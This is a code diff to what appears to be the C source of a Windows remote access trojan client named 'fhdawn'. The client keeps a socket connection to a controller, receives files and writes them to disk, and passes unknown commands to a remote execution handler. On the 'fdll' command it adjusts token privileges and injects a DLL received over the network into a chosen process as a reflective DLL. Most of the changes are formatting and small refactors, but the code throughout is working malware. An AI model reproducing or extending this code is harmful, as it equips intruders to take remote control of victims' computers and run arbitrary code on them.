@@ -10,6 +10,13 @@ Modified: -
 
 int fsize = 0;
 char* fileinfo[3];
+
+TOKEN_PRIVILEGES priv = { 0 };
+HANDLE hModule = NULL;
+HANDLE hProcess = NULL;
+HANDLE hToken = NULL;
+
+
 #define BREAK_WITH_ERROR( e ) { sockprintf(sockfd, "[-] %s. Error=%ld", e, GetLastError() ); break; }
 
 
@@ -36,23 +43,23 @@ void REConnect(void)
 void sockSend(const char* data)
 {
     int lerror = WSAGetLastError();
-	int totalsent = 0;
-	int buflen = strlen(data);
-	while (buflen > totalsent) {
-		int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
-		if (lerror == WSAECONNRESET)
-		{
-			connected = FALSE;
-		}
-		if (r < 0) return;
-		totalsent += r;
-	}
-	return;
+    int totalsent = 0;
+    int buflen = strlen(data);
+    while (buflen > totalsent) {
+        int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
+        if (lerror == WSAECONNRESET)
+        {
+            connected = FALSE;
+        }
+        if (r < 0) return;
+        totalsent += r;
+    }
+    return;
 }
 
 void fhdawn_main(void)
 {
-    while(connected)
+    while (connected)
     {
         memset(recvbuf, '\0', BUFFER);
         int return_code = recv(sockfd, recvbuf, BUFFER, 0);
@@ -61,7 +68,7 @@ void fhdawn_main(void)
             connected = FALSE;
         }
 
-        if(strcmp(recvbuf, "checkhost") == 0)
+        if (strcmp(recvbuf, "checkhost") == 0)
         {
             memset(recvbuf, '\0', BUFFER);
             int return_code = recv(sockfd, recvbuf, BUFFER, 0);
@@ -83,7 +90,7 @@ void fhdawn_main(void)
             memset(temp, '\0', BUFFER); // Clear temp
             memset(fileinfo, '\0', 2);
             int return_code = recv(sockfd, temp, BUFFER, 0); // Receive File information from server (filename:filesize)
-            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET) 
+            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
             {
                 connected = FALSE;
             }
@@ -91,13 +98,15 @@ void fhdawn_main(void)
             expected = atoi(fileinfo[1]); // Convert filesize to integer. Filesize is the expected file size.
             // Create file.
             HANDLE recvfile = CreateFile(fileinfo[0], FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-            if(recvfile == INVALID_HANDLE_VALUE){
+            if (recvfile == INVALID_HANDLE_VALUE) {
                 sockprintf(sockfd, "[Error Creating File] : %ld", GetLastError());
-            } else {
+            }
+            else {
                 memset(recvbuf, '\0', BUFFER); // Clear main buffer
                 int total = 0; // Total bytes received
-                do {
-                    fsize = recv(sockfd, recvbuf, BUFFER, 0 ); // Receive file
+                
+                do{ // IF Total is equal to expected bytes. Break the loop, And stop receiving.
+                    fsize = recv(sockfd, recvbuf, BUFFER, 0); // Receive file
                     if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                     {
                         connected = FALSE;
@@ -105,26 +114,20 @@ void fhdawn_main(void)
                     }
                     write = WriteFile(recvfile, recvbuf, fsize, &dwBytesWritten, NULL); // Write file data to file
                     total += fsize; // Add number of bytes received to total.
-                } while(total != expected); // IF Total is equal to expected bytes. Break the loop, And stop receiving.
-
-                if(write == FALSE)
+                } while(total != expected);
+                
+                if (write == FALSE)
                 {
-                    sockprintf(sockfd,"[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
-                } else {
-                    sockprintf(sockfd,"\n[ Received File : %s ]\n[ File Size : %s bytes ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
+                    sockprintf(sockfd, "[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
+                }
+                else {
+                    sockprintf(sockfd, "\n[ Received File : %s ]\n[ File Size : %s bytes ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
                 }
                 CloseHandle(recvfile);
             }
         }
         else if (strcmp(recvbuf, "fdll") == 0)
         {
-            
-            TOKEN_PRIVILEGES priv = { 0 };
-            HANDLE hModule = NULL;
-            HANDLE hProcess = NULL;
-            HANDLE hToken = NULL;
-
-            
             memset(recvbuf, '\0', BUFFER);
             int return_code = recv(sockfd, recvbuf, BUFFER, 0);
             if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
@@ -139,14 +142,14 @@ void fhdawn_main(void)
             memset(recvbuf, '\0', BUFFER);
             ZeroMemory(DLL, expected + 1);
             int total = 0;
-            do {
+            // set_blocking_mode(sockfd, FALSE);
+            do{
                 fsize = recv(sockfd, recvbuf, BUFFER, 0);
                 memcpy(DLL + total, recvbuf, fsize);
                 total += fsize;
-            } while (total != expected);
+            } while(total != expected);
+            // set_blocking_mode(sockfd, TRUE);
 
-            sockprintf(sockfd, "Got DLL of size %i bytes.\n", total);
-            
             do {
                 if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
                 {
@@ -168,6 +171,7 @@ void fhdawn_main(void)
                     BREAK_WITH_ERROR("Failed to inject the DLL");
 
                 WaitForSingleObject(hModule, -1);
+                sockprintf(sockfd, "Successfully Injected Reflective DLL at PID %ld\n", dwProcessId);
             } while (0);
 
             if (DLL)
@@ -184,10 +188,10 @@ void fhdawn_main(void)
         else {
             ExecSock();
         }
-        
-    }    
 
-    if(!connected)
+    }
+
+    if (!connected)
     {
         REConnect();
     }
@@ -196,7 +200,7 @@ void fhdawn_main(void)
 void StartWSA(void)
 {
     WSADATA wsa;
-    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
     {
         printf("[Error] Error Starting Winsock.");
         WSAReportError();
@@ -207,8 +211,9 @@ void StartWSA(void)
 void MainConnect(void)
 {
     StartWSA();
-    sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-    if(sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
+    //sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
     {
         printf("Socket Creation Error. ");
 
@@ -227,7 +232,7 @@ void MainConnect(void)
         else {
             connected = TRUE;
         }
-    } while (!connected); 
+    } while (!connected);
 
     fhdawn_main();
 }
